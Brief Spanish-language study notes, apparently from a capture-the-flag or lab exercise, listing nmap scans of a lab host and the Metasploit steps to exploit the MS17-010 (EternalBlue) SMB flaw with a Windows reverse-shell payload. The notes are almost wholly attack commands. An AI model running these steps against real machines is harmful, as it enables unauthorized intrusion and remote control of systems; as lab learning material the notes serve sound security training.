Parte 1:

nmap 10.10.38.140 --scaneo de la ip

nmap -vv -sV -A -O -sC -p 135,139,445,3389 10.10.38.140 --scaneo de los purtos abiertos y sistema operativo

nmap --script smb-vuln-ms17-010 -p445 10.10.38.140 --scaneo para saber si la maquina es vulnerable a este excploit tras la verison del sistema operativo\\

estos 3 pasos se pueden hacer asi: ```nmap -vv -sV -sC -O -A -p445 -T4 --script vuln <ip>```

Parte 2:

usamos msfconsole

search ms17 --para buscar el exploit en metasplit y poder usarlo

use 0 --es el exploit que necesitamos

show options -- para ver que opciones debemos ajustar como el RHOSTS

set RHOSTS 10.10.38.140 --apra poder atacar a la maquina

set payload windows/x64/shell/reverse_tcp --lo dice el ejercicio

run --ejecutamos el exploit

